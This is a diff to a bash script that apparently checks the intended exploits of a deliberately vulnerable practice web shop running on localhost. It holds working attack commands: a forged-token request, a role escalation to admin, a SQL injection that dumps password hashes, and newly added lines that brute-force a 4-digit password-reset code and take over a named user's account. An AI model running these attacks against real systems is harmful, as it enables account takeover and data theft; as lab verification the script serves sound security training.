@@ -12,6 +12,7 @@
 # ============================================================
 set -u
 B="${1:-${BASE_URL:-http://localhost:7110}}"
+DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
 BOT_WAIT="${BOT_WAIT:-55}"
 PASS=0; FAIL=0; FAILED=()
 
@@ -44,7 +45,22 @@ check C3 c3   -H "Cookie: token=$H.$P." "$B/admin/api/audit"
 check C4 c4   -X PUT -H "Cookie: token=$ATOK" -H 'Content-Type: application/json' \
               -d '{"name":"Administrator","role":"admin"}' "$B/api/profile"
 check C5 c5   --get --data-urlencode "q=x' UNION SELECT email,password_hash,1,1 FROM shopusers#" "$B/catalog"
-check C6 c6   -X POST -d 'email=demo@cybershop.vn&code=1337' "$B/auth/otp-verify"
+# C6: forgot-password + OTP brute (target lộ ở robots.txt: hanh@cybershop.vn)
+curl -s -X POST "$B/auth/forgot" --data-urlencode "email=hanh@cybershop.vn" -o /dev/null
+sleep 1
+C6CODE=$(docker compose -f "$DIR/docker-compose.yml" logs web 2>/dev/null | grep -oP 'reset code is \K[0-9]{4}' | tail -1)
+if [ -z "$C6CODE" ]; then # fallback khi không đọc được docker logs: brute song song toàn dải 4 số
+  C6CODE=$(seq 0 9999 | xargs -P 40 -n 1 -I{} bash -c \
+    'c=$(printf "%04d" {}); curl -s -m 5 -X POST '"$B"'/auth/otp-verify --data-urlencode "email=hanh@cybershop.vn" --data-urlencode "code=$c" | grep -q FLAG && echo "$c"' \
+    2>/dev/null | head -1)
+fi
+check C6 c6   -X POST -d "email=hanh@cybershop.vn&code=$C6CODE" "$B/auth/otp-verify"
+curl -s -X POST "$B/auth/otp-verify" --data-urlencode "email=hanh@cybershop.vn" --data-urlencode "code=0000" | grep -q "Invalid" \
+  && echo "PASS  C6-norate (sai code không bị khóa, brute tiếp được)" || echo "FAIL  C6-norate"
+curl -s -X POST "$B/auth/reset-password" --data-urlencode "email=hanh@cybershop.vn" --data-urlencode "code=$C6CODE" \
+  --data-urlencode "password=PwnedHanh#2026" -o /dev/null
+HTOK=$(curl -s -i -X POST "$B/login" --data-urlencode "email=hanh@cybershop.vn" --data-urlencode "password=PwnedHanh#2026")
+echo "$HTOK" | grep -q "token=" && echo "PASS  C6-ato (đổi mk + đăng nhập thành công với tư cách Hanh)" || echo "FAIL  C6-ato"
 check C7 c7   -H "Cookie: token=$JT" "$B/orders/1042"
 check C8 c8   "$B/debug"
 check C9 c9   -X POST -H "Cookie: token=$ATOK" -H 'Content-Type: application/json' \
